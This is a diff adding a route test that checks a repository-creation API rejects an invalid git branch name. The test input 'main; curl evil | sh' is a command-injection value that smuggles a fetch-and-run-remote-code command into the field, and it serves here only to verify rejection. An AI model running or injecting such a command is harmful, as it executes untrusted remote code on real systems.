@@ -203,6 +203,22 @@ describe('repositoryRoutes', () => {
   });
 
   describe('POST /api/v1/repositories', () => {
+    it('rejects a defaultBranch that is not a valid git ref name (400)', async () => {
+      const res = await ctx.app.inject({
+        body: {
+          defaultBranch: 'main; curl evil | sh',
+          organizationName: 'acme',
+          repoName: 'api',
+          teamId: TEAM_ID,
+        },
+        headers: AUTH_HEADER,
+        method: 'POST',
+        url: '/api/v1/repositories',
+      });
+      expect(res.statusCode).toBe(400);
+      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
+    });
+
     it('refuses to create an MCP connection through the repository path (400)', async () => {
       const res = await ctx.app.inject({
         body: { config: { url: 'http://mcp.internal' }, teamId: TEAM_ID, type: 'mcp' },
